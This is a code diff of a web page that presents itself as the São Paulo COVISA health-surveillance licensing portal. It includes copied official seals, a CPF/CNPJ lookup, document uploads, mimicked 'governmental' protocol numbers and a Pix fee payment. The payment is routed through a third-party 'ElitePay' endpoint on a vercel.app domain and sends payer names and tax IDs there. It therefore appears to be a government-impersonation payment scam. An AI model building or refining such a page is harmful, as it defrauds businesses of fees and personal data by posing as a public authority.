-        <div class="selos-container" style="display: flex; justify-content: space-between; align-items: center; width: 100%; max-width: 550px; gap: 15px;">
-            <a href="https://call.icom-libras.com.br/smped/chamada/video?svId=6a144745-22d2-408c-9649-356872449766&preCall=true&queue=icom" class="selo-link" target="_blank" title="CIL - Central de Intermediação em Libras">
-                <img src="imagens/selo1.jpg" alt="CIL" />
-            </a>
-            <a href="http://selodigital.imprensaoficial.com.br/validacao/SMPED/01195459cd224b834f" class="selo-link" target="_blank" title="Selo CPA - Acessibilidade Digital">
-                <img src="imagens/selo2.jpg" alt="CPA" />
-            </a>
-            <a href="https://sites.tcu.gov.br/verifique-adesao-pnpc/" class="selo-link" target="_blank" title="Programa Nacional de Prevenção à Corrupção">
-                <img src="imagens/selo3.jpg" alt="Prevenção" />
-            </a>
-            <a href="https://prefeitura.sp.gov.br/web/controladoria_geral/w/a_cgm/329588" class="selo-link" target="_blank" title="Transparência e Boas Práticas de Gestão">
-                <img src="imagens/selo4.jpg" alt="Transparência" />
-            </a>
-        </div>
-      </div>
-
-      <div class="footer-grid">
-        <div><img src="imagens/5.png" class="footer-logo" alt="Brasão SP" style="height: 80px !important; width: auto !important;" /><p>Secretaria Municipal da Saúde<br />Coordenação de Vigilância em Saúde</p></div>
-        <div><h4>Institucional</h4><ul><li>Quem Somos</li><li>Organograma</li><li>Transparência</li></ul></div>
-        <div><h4>Serviços</h4><ul><li>Licenciamento</li><li>Consultas</li><li>Taxas</li></ul></div>
-        <div><h4>Canais</h4><ul><li>156</li><li>Ouvidoria</li><li>e-SIC</li></ul></div>
-      </div>
-      <div class="footer-bottom"><p>© 2026 Prefeitura de São Paulo. Todos os direitos reservados.</p></div>
-    </div>
-  </footer>
-
-  <div class="chat-widget-btn" onclick="window.toggleChat()"><i class="fas fa-comment-dots"></i></div>
-  <div class="chat-interface" id="chat-interface">
-    <div class="chat-header"><span>Assistente IA COVISA</span><i class="fas fa-times" onclick="window.toggleChat()" style="cursor:pointer;"></i></div>
-    <div class="chat-body" id="chat-body"><div class="chat-bubble bubble-ai">Olá! Sou a Ana, a Inteligência Artificial da COVISA. Como posso orientá-lo hoje sobre nossos serviços?</div></div>
-    <form class="chat-input" id="chat-form">
-      <input type="text" id="chat-msg" placeholder="Digite sua dúvida..." required />
-      <button type="submit" id="btn-send-chat"><i class="fas fa-paper-plane"></i></button>
-    </form>
-  </div>
+    .process-step { border-top-color: #e2e8f0; opacity: 0.6; background: #fff; transition: 0.3s; }
+    .process-step.active-step { border-top-color: var(--gov-blue); opacity: 1; background: #f0f4f8; transform: scale(1.05); box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
+    .process-step.warning-step { border-top-color: var(--warning); opacity: 1; background: #fffbeb; transform: scale(1.05); box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
+    .process-step.success-step { border-top-color: var(--success-color); opacity: 1; background: #f0fdf4; transform: scale(1.05); box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
+    .process-step.completed-step { border-top-color: var(--success-color); opacity: 1; background: #f0fdf4; }
+    </style>
 
   <script type="module">
     window.destravarEndereco = function() {
@@ -924,20 +415,29 @@
     };
 
     window.updateVisualSteps = function(stepNumber) {
-        document.getElementById('step-visual-1').style = 'border-top-color: #e2e8f0; opacity: 0.6; background: #fff;';
-        document.getElementById('step-visual-2').style = 'border-top-color: #e2e8f0; opacity: 0.6; background: #fff;';
-        document.getElementById('step-visual-3').style = 'border-top-color: #e2e8f0; opacity: 0.6; background: #fff;';
-
-        if(stepNumber === 1) document.getElementById('step-visual-1').style = 'border-top-color: var(--gov-blue); opacity: 1; background: #f0f4f8; transform: scale(1.05); transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05);';
-        if(stepNumber === 2) document.getElementById('step-visual-2').style = 'border-top-color: var(--warning); opacity: 1; background: #fffbeb; transform: scale(1.05); transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05);';
-        if(stepNumber === 3) document.getElementById('step-visual-3').style = 'border-top-color: var(--success-color); opacity: 1; background: #f0fdf4; transform: scale(1.05); transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05);';
+        document.getElementById('step-visual-1').style = 'border-top-color: #e2e8f0; opacity: 0.6; background: #fff; transform: scale(1); box-shadow: none;';
+        document.getElementById('step-visual-2').style = 'border-top-color: #e2e8f0; opacity: 0.6; background: #fff; transform: scale(1); box-shadow: none;';
+        document.getElementById('step-visual-3').style = 'border-top-color: #e2e8f0; opacity: 0.6; background: #fff; transform: scale(1); box-shadow: none;';
+        
+        if(stepNumber === 1) {
+            document.getElementById('step-visual-1').style = 'border-top-color: var(--gov-blue); opacity: 1; background: #f0f4f8; transform: scale(1.05); transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05);';
+        }
+        if(stepNumber === 2) {
+            document.getElementById('step-visual-1').style = 'border-top-color: var(--success-color); opacity: 1; background: #f0fdf4;';
+            document.getElementById('step-visual-2').style = 'border-top-color: var(--warning); opacity: 1; background: #fffbeb; transform: scale(1.05); transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05);';
+        }
+        if(stepNumber === 3) {
+            document.getElementById('step-visual-1').style = 'border-top-color: var(--success-color); opacity: 1; background: #f0fdf4;';
+            document.getElementById('step-visual-2').style = 'border-top-color: var(--success-color); opacity: 1; background: #f0fdf4;';
+            document.getElementById('step-visual-3').style = 'border-top-color: var(--success-color); opacity: 1; background: #f0fdf4; transform: scale(1.05); transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05);';
+        }
     };
 
     window.consultarDocumentoTopo = async function() {
         const input = document.getElementById('main-search-input');
         const btn = document.getElementById('main-search-btn');
         let query = input.value.replace(/\D/g, ''); // Limpa tudo que nao for numero
-
+        
         if(query.length !== 11 && query.length !== 14) {
             alert("Por favor, digite um CPF (11 números) ou CNPJ (14 números) válido.");
             return;
@@ -974,11 +474,11 @@
                 let req = await fetch(`https://brasilapi.com.br/api/cnpj/v1/${query}`);
                 if(!req.ok) throw new Error("CNPJ não encontrado");
                 let dados = await req.json();
-
+                
                 let nome = dados.nome_fantasia || dados.razao_social;
                 let situacao = dados.descricao_situacao_cadastral || "ATIVA";
                 let corSituacao = situacao.toUpperCase() === "ATIVA" ? "var(--success-color)" : "var(--sp-red)";
-
+                
                 resultArea.innerHTML = `
                   <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; border-bottom:1px solid #ccc; padding-bottom:10px;">
                     <strong style="color:var(--gov-dark-blue); font-size:1.1rem;"><i class="fas fa-building"></i> Dados da Empresa</strong>
@@ -1113,6 +613,7 @@
 
     window.idPedidoConsultaAtual = null; 
     window.dadosPedidoAtual = {}; 
+    window.captchaValidado = false;
 
     window.crc16 = function(payload) {
         let polynomial = 0x1021;
@@ -1319,21 +820,21 @@
                   const arrayBuffer = await file.arrayBuffer();
                   const pdf = await pdfjsLib.getDocument({data: arrayBuffer}).promise;
                   const page = await pdf.getPage(1); // Pega só a primeira página para caber no banco
-
+                  
                   const viewport = page.getViewport({scale: 1.0}); // Renderiza num tamanho normal
                   const canvas = document.createElement('canvas');
                   const ctx = canvas.getContext('2d');
-
+                  
                   // Força um tamanho menor se o PDF for gigante
                   let scale = 1;
                   if (viewport.width > 800) scale = 800 / viewport.width;
                   const scaledViewport = page.getViewport({scale: scale});
-
+                  
                   canvas.height = scaledViewport.height;
                   canvas.width = scaledViewport.width;
 
                   await page.render({canvasContext: ctx, viewport: scaledViewport}).promise;
-
+                  
                   // Converte o canvas para imagem JPEG de baixa qualidade (leve)
                   const base64Reduzido = canvas.toDataURL('image/jpeg', 0.4); 
                   resolve(base64Reduzido);
@@ -1344,7 +845,7 @@
               // SE FOR IMAGEM: Comprime bem mais forte que antes
               const reader = new FileReader();
               reader.readAsDataURL(file);
-
+              
               reader.onload = (event) => {
                   const img = new Image();
                   img.src = event.target.result;
@@ -1362,6 +863,15 @@
                       canvas.height = height;
                       const ctx = canvas.getContext('2d');
                       ctx.drawImage(img, 0, 0, width, height);
+
+                      // CARIMBO DE SEGURANÇA (Watermark)
+                      const dataAtual = new Date().toLocaleString('pt-BR');
+                      const textoCarimbo = "DOCUMENTO RECEBIDO VIA PORTAL COVISA - " + dataAtual;
+                      ctx.fillStyle = "rgba(255, 255, 255, 0.7)";
+                      ctx.fillRect(0, height - 30, width, 30);
+                      ctx.font = "14px Arial";
+                      ctx.fillStyle = "red";
+                      ctx.fillText(textoCarimbo, 10, height - 10);
 
                       // Qualidade de 0.5 para 0.4 (comprime mais)
                       const base64Reduzido = canvas.toDataURL('image/jpeg', 0.4);
@@ -1465,7 +975,7 @@
 
             const margemEsquerdaTextos = 22;  
             const margemEsquerdaDados = 200;  
-            let alturaAtual = 544;             
+            let alturaAtual = 544;            
             const espacoEntreLinhas = 10;   
             const tamanhoLetra = 10;         
 
@@ -1854,10 +1364,7 @@
     if (formDenuncia) {
         formDenuncia.addEventListener('submit', async (e) => {
           e.preventDefault();
-
-          // VALIDAÇÃO GOOGLE RECAPTCHA
-          const recaptchaResponse = e.target.querySelector('[name="g-recaptcha-response"]').value;
-          if(!recaptchaResponse) { alert("Por favor, confirme que você não é um robô (reCAPTCHA)."); return; }
+          if(typeof grecaptcha !== "undefined" && grecaptcha.getResponse() === '') { alert("Por favor, marque a caixa 'Não sou um robô'."); return; }
 
           const btnSubmit = document.getElementById('btn-submit-denuncia');
           const textoOriginal = btnSubmit.innerHTML;
@@ -1931,12 +1438,18 @@
                   document.getElementById('barra-progresso').style.display = 'none';
               } else {
                   const pedido = snapshot.docs[0].data();
+                  
                   window.idPedidoConsultaAtual = snapshot.docs[0].id;
-
-                  let numProtocolo = window.idPedidoConsultaAtual.substring(0, 6).toUpperCase();
+                  
+                  // Formato de protocolo governamental
+                  let idCurto = window.idPedidoConsultaAtual.substring(0, 6).toUpperCase();
+                  let dataHoje = new Date();
+                  let anoMes = dataHoje.getFullYear().toString() + (dataHoje.getMonth() + 1).toString().padStart(2, '0');
+                  let numProtocolo = `COVISA-${anoMes}-${idCurto}`;
+                  
                   let badgeProtocolo = `<div style="text-align: center; margin-bottom: 20px;">
                       <span style="background: #1e293b; color: #f8fafc; padding: 8px 20px; border-radius: 8px; font-weight: 600; font-family: 'Courier New', monospace; font-size: 1.1rem; box-shadow: 0 4px 10px rgba(0,0,0,0.15); display: inline-block;">
-                          Protocolo ID: <span style="color: #38bdf8; font-weight: 900;">COVISA-2026-${numProtocolo}</span>
+                          Protocolo ID: <span style="color: #38bdf8; font-weight: 900;">${numProtocolo}</span>
                       </span>
                   </div>`;
 
@@ -1963,17 +1476,17 @@
                           <input type="file" id="upload-assinado" style="display:none;" accept="application/pdf, image/*" onchange="window.enviarAssinatura(this)">
                           </div>
                       `;
-                      atualizarBarraProgresso(4); window.updateVisualSteps(3);
+                      atualizarBarraProgresso(4); document.getElementById('step-visual-1').className='process-step completed-step'; document.getElementById('step-visual-2').className='process-step completed-step'; document.getElementById('step-visual-3').className='process-step success-step';
                   } else if (pedido.aguardando_alvara === true || pedido.aguardando_alvara === "true") {
                       divPix.style.display = 'none'; divMsg.style.display = 'block';
                       divMsg.style.background = '#dcfce3'; divMsg.style.color = '#166534'; divMsg.style.borderColor = '#10b981';
                       textMsg.innerHTML = badgeProtocolo + '<i class="fas fa-check-circle" style="font-size:1.5rem; margin-bottom: 10px; color: #10b981;"></i><br><strong style="font-size:1.3rem;">Pagamento Confirmado!</strong><br><br>A sua taxa foi processada com sucesso.<br><div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; border: 1px dashed #10b981; margin-top: 15px;"><i class="fas fa-file-signature" style="font-size: 1.5rem; margin-bottom: 10px;"></i><br><strong>Aguarde a emissão da sua licença.</strong><br>O sistema está gerando o seu documento oficial, que ficará disponível nesta página em breve.</div>';
-                      atualizarBarraProgresso(4); window.updateVisualSteps(3);
+                      atualizarBarraProgresso(4); document.getElementById('step-visual-1').className='process-step completed-step'; document.getElementById('step-visual-2').className='process-step completed-step'; document.getElementById('step-visual-3').className='process-step success-step';
                   } else if (!pedido.valor) {
                       divPix.style.display = 'none'; divMsg.style.display = 'block';
                       divMsg.style.background = '#fffbeb'; divMsg.style.color = '#b45309'; divMsg.style.borderColor = '#f59e0b';
                       textMsg.innerHTML = badgeProtocolo + '<i class="fas fa-search-location" style="font-size:1.5rem; margin-bottom: 10px; color: var(--warning);"></i><br><strong style="font-size:1.2rem; color: var(--warning);">Análise em Andamento</strong><br>Sua documentação está sendo analisada pelos fiscais de plantão. Volte a consultar em alguns instantes.';
-                      atualizarBarraProgresso(2); window.updateVisualSteps(2);
+                      atualizarBarraProgresso(2); document.getElementById('step-visual-1').className='process-step completed-step'; document.getElementById('step-visual-2').className='process-step warning-step'; document.getElementById('step-visual-3').className='process-step';
                   } else {
                       divMsg.style.display = 'none'; divPix.style.display = 'block';
 
@@ -1988,37 +1501,79 @@
                       document.getElementById('valor-cobrado').innerText = valorFormatado;
                       valorPixParaComprovante = valorFormatado;
 
-                      // --- INÍCIO DA INTEGRAÇÃO ELITEPAY VIA VERCEL (COM BLOQUEIO DE 30 MIN E WEBHOOK) ---
-                      document.getElementById('pix-copia-cola').value = "Gerando Pix oficial, aguarde...";
-                      document.querySelector('.qr-container img').src = "https://i.gifer.com/ZKZg.gif"; 
-
-                      let tempoRestanteTimer = 1800;
-
-                      try {
-                          let valorCobrado = parseFloat(valorLimpo.replace(',', '.'));
-
-                          // CHAMANDO A API DO VERCEL QUE CRIAMOS
-                          const LINK_DO_VERCEL = 'https://portal-vigilancia-one.vercel.app/api/pix.js';
-
-                          let chaveCache = 'pix_gerado_' + pedido.cnpj.replace(/\D/g, '');
-                          let pixCache = localStorage.getItem(chaveCache);
-                          let dadosPix = null;
-                          let usarCache = false;
-
-                          if (pixCache) {
-                              let parseCache = JSON.parse(pixCache);
-                              let tempoPassado = Math.floor((Date.now() - parseCache.timestamp) / 1000);
+                      // --- NOVO: ESCUTADOR EM TEMPO REAL ---
+                      const docRefAtual = doc(db, "pedidos", window.idPedidoConsultaAtual);
+                      const unsubscribePagamento = onSnapshot(docRefAtual, (docSnap) => {
+                          if (docSnap.exists()) {
+                              const dadosAtualizados = docSnap.data();
                               
-                              if (tempoPassado < 1800) {
-                                  dadosPix = parseCache.dados;
-                                  tempoRestanteTimer = 1800 - tempoPassado;
-                                  usarCache = true;
-                              } else {
-                                  localStorage.removeItem(chaveCache);
+                              if (dadosAtualizados.aguardando_alvara === true || dadosAtualizados.aguardando_alvara === "true") {
+                                  unsubscribePagamento(); 
+                                  
+                                  document.getElementById('resultado-pix').style.display = 'none';
+                                  document.getElementById('mensagem-status').style.display = 'block';
+                                  document.getElementById('mensagem-status').style.background = '#dcfce3';
+                                  document.getElementById('mensagem-status').style.color = '#166534';
+                                  document.getElementById('mensagem-status').style.borderColor = '#10b981';
+                                  
+                                  document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + `
+                                      <i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br>
+                                      <strong style="font-size:1.6rem; text-transform:uppercase;">Pagamento Autorizado!</strong><br><br>
+                                      O seu Pix foi processado e a taxa regularizada.<br><br>
+                                      <div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; border: 1px dashed #10b981; margin-top: 10px;">
+                                          <i class="fas fa-file-signature" style="font-size: 1.5rem; margin-bottom: 10px;"></i><br>
+                                          <strong>Aguarde a emissão da sua licença.</strong><br>
+                                          O documento oficial ficará disponível aqui.
+                                      </div>
+                                  `;
+                                  atualizarBarraProgresso(4); document.getElementById('step-visual-1').className='process-step completed-step'; document.getElementById('step-visual-2').className='process-step completed-step'; document.getElementById('step-visual-3').className='process-step success-step';
+                                  if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
+                              } else if (dadosAtualizados.pago === true || dadosAtualizados.pago === "true") {
+                                  unsubscribePagamento();
+                                  document.getElementById('resultado-pix').style.display = 'none';
+                                  document.getElementById('mensagem-status').style.display = 'block';
+                                  document.getElementById('mensagem-status').style.background = '#dcfce3';
+                                  document.getElementById('mensagem-status').style.color = '#166534';
+                                  document.getElementById('mensagem-status').style.borderColor = '#10b981';
+                                  document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + '<i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br><strong style="font-size:1.6rem; text-transform:uppercase;">Licença Emitida!</strong><br><br>Atualize a página para baixar seu alvará.';
+                                  atualizarBarraProgresso(4); document.getElementById('step-visual-1').className='process-step completed-step'; document.getElementById('step-visual-2').className='process-step completed-step'; document.getElementById('step-visual-3').className='process-step success-step';
+                                  if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
                               }
                           }
+                      });
+                      // --- FIM DO ESCUTADOR ---
 
-                          if (!usarCache) {
+                      // --- SISTEMA DE BLOQUEIO DE 30 MINUTOS (ANTI-SPAM DE PIX) ---
+                      const tempoBloqueio = 30 * 60 * 1000; // 30 minutos
+                      const pixSalvo = localStorage.getItem('pix_gerado_' + window.idPedidoConsultaAtual);
+                      const tempoSalvo = localStorage.getItem('pix_tempo_' + window.idPedidoConsultaAtual);
+                      const tempoAtual = new Date().getTime();
+
+                      if (pixSalvo && tempoSalvo && (tempoAtual - tempoSalvo < tempoBloqueio)) {
+                          // Já existe PIX gerado nos últimos 30 min. Recupera!
+                          const dadosPix = JSON.parse(pixSalvo);
+                          document.getElementById('pix-copia-cola').value = dadosPix.copyPaste;
+                          let qrSrc = dadosPix.qrcodeUrl;
+                          if (qrSrc.startsWith('base64:')) {
+                              qrSrc = 'data:image/png;base64,' + qrSrc.replace('base64:', '');
+                          }
+                          document.querySelector('.qr-container img').src = qrSrc;
+                          
+                          let tempoRestante = Math.floor((tempoBloqueio - (tempoAtual - tempoSalvo)) / 1000);
+                          
+                          cnpjParaComprovante = cnpj;
+                          atualizarBarraProgresso(3); 
+                          document.getElementById('step-visual-1').className='process-step completed-step'; document.getElementById('step-visual-2').className='process-step completed-step'; document.getElementById('step-visual-3').className='process-step warning-step';
+                          iniciarCronometroPix(tempoRestante); 
+                      } else {
+                          // Gera Pix Novo
+                          document.getElementById('pix-copia-cola').value = "Gerando Pix oficial, aguarde...";
+                          document.querySelector('.qr-container img').src = "https://i.gifer.com/ZKZg.gif"; 
+
+                          try {
+                              let valorCobrado = parseFloat(valorLimpo.replace(',', '.'));
+                              const LINK_DO_VERCEL = 'https://portal-vigilancia-one.vercel.app/api/pix.js';
+
                               const responsePix = await fetch(LINK_DO_VERCEL, {
                                   method: 'POST',
                                   headers: { 'Content-Type': 'application/json' },
@@ -2026,87 +1581,40 @@
                                       amount: valorCobrado,
                                       description: `Taxa COVISA - Processo ${window.idPedidoConsultaAtual}`,
                                       payerName: pedido.nome,
-                                      payerDocument: pedido.cnpj.replace(/\D/g, ''),
-                                      externalReference: window.idPedidoConsultaAtual // ADD ESSA LINHA PARA O WEBHOOK SABER QUEM PAGOU
+                                      payerDocument: pedido.cnpj.replace(/\D/g, '') // Manda só os números
                                   })
                               });
 
-                              dadosPix = await responsePix.json();
+                              const dadosPix = await responsePix.json();
 
                               if (dadosPix.success) {
-                                  localStorage.setItem(chaveCache, JSON.stringify({
-                                      timestamp: Date.now(),
-                                      dados: dadosPix
-                                  }));
-                              }
-                          }
+                                  // SALVA NO LOCALSTORAGE PARA BLOQUEAR POR 30 MIN
+                                  localStorage.setItem('pix_gerado_' + window.idPedidoConsultaAtual, JSON.stringify(dadosPix));
+                                  localStorage.setItem('pix_tempo_' + window.idPedidoConsultaAtual, tempoAtual);
 
-                          if (dadosPix.success) {
-                              document.getElementById('pix-copia-cola').value = dadosPix.copyPaste;
-
-                              let qrSrc = dadosPix.qrcodeUrl;
-                              if (qrSrc.startsWith('base64:')) {
-                                  qrSrc = 'data:image/png;base64,' + qrSrc.replace('base64:', '');
-                              }
-                              document.querySelector('.qr-container img').src = qrSrc;
-
-                              // --- NOVO: ESCUTADOR EM TEMPO REAL ---
-                              const docRefAtual = doc(db, "pedidos", window.idPedidoConsultaAtual);
-                              const unsubscribePagamento = onSnapshot(docRefAtual, (docSnap) => {
-                                  if (docSnap.exists()) {
-                                      const dadosAtualizados = docSnap.data();
-
-                                      if (dadosAtualizados.pago === true || dadosAtualizados.pago === "true") {
-                                          unsubscribePagamento();
-                                          document.getElementById('resultado-pix').style.display = 'none';
-                                          document.getElementById('mensagem-status').style.display = 'block';
-                                          document.getElementById('mensagem-status').style.background = '#dcfce3';
-                                          document.getElementById('mensagem-status').style.color = '#166534';
-                                          document.getElementById('mensagem-status').style.borderColor = '#10b981';
-                                          document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + '<i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br><strong style="font-size:1.6rem; text-transform:uppercase;">Licença Emitida!</strong><br><br>Atualize a página para baixar seu alvará.';
-                                          atualizarBarraProgresso(4); window.updateVisualSteps(3);
-                                          if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
-                                      } else if (dadosAtualizados.aguardando_alvara === true || dadosAtualizados.aguardando_alvara === "true") {
-                                          // ATENÇÃO: NÃO DAMOS UNSUBSCRIBE AQUI! ASSIM ELE CONTINUA ESCUTANDO PARA QUANDO O ADMIN LIBERAR O ALVARÁ
-                                          document.getElementById('resultado-pix').style.display = 'none';
-                                          document.getElementById('mensagem-status').style.display = 'block';
-                                          document.getElementById('mensagem-status').style.background = '#dcfce3';
-                                          document.getElementById('mensagem-status').style.color = '#166534';
-                                          document.getElementById('mensagem-status').style.borderColor = '#10b981';
-
-                                          document.getElementById('texto-mensagem').innerHTML = badgeProtocolo + `
-                                              <i class="fas fa-check-circle" style="font-size:3rem; margin-bottom: 15px; color: #10b981;"></i><br>
-                                              <strong style="font-size:1.6rem; text-transform:uppercase;">Pagamento Autorizado!</strong><br><br>
-                                              O seu Pix foi processado e a taxa regularizada.<br><br>
-                                              <div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; border: 1px dashed #10b981; margin-top: 10px;">
-                                                  <i class="fas fa-file-signature" style="font-size: 1.5rem; margin-bottom: 10px;"></i><br>
-                                                  <strong>Aguarde a emissão da sua licença.</strong><br>
-                                                  O documento oficial ficará disponível aqui.
-                                              </div>
-                                          `;
-                                          atualizarBarraProgresso(4); window.updateVisualSteps(3);
-                                          if (typeof timerInterval !== 'undefined') clearInterval(timerInterval);
-                                      }
+                                  document.getElementById('pix-copia-cola').value = dadosPix.copyPaste;
+                                  let qrSrc = dadosPix.qrcodeUrl;
+                                  if (qrSrc.startsWith('base64:')) {
+                                      qrSrc = 'data:image/png;base64,' + qrSrc.replace('base64:', '');
                                   }
-                              });
-                              // --- FIM DO ESCUTADOR ---
+                                  document.querySelector('.qr-container img').src = qrSrc;
 
-                          } else {
-                              alert("Erro no Gateway: " + JSON.stringify(dadosPix));
-                              document.getElementById('pix-copia-cola').value = "Falha ao gerar código.";
+                                  cnpjParaComprovante = cnpj;
+                                  atualizarBarraProgresso(3); 
+                                  document.getElementById('step-visual-1').className='process-step completed-step'; document.getElementById('step-visual-2').className='process-step completed-step'; document.getElementById('step-visual-3').className='process-step warning-step';
+                                  iniciarCronometroPix(1800); 
+                              } else {
+                                  alert("Erro no Gateway: " + JSON.stringify(dadosPix));
+                                  document.getElementById('pix-copia-cola').value = "Falha ao gerar código.";
+                                  document.querySelector('.qr-container img').src = "imagens/pix.jpeg";
+                              }
+                          } catch (e) {
+                              console.error("ERRO DO FETCH:", e);
+                              alert("Erro de comunicação com o servidor de pagamento.");
+                              document.getElementById('pix-copia-cola').value = "Falha de conexão com a API.";
                               document.querySelector('.qr-container img').src = "imagens/pix.jpeg";
                           }
-                      } catch (e) {
-                          console.error("ERRO DO FETCH:", e);
-                          alert("Erro de comunicação com o servidor de pagamento.");
-                          document.getElementById('pix-copia-cola').value = "Falha de conexão com a API.";
-                          document.querySelector('.qr-container img').src = "imagens/pix.jpeg";
                       }
-                      // --- FIM DA INTEGRAÇÃO ELITEPAY ---
-
-                      cnpjParaComprovante = cnpj;
-                      atualizarBarraProgresso(3); window.updateVisualSteps(3);
-                      iniciarCronometroPix(tempoRestanteTimer); 
                   }
               }
           } catch(err) {
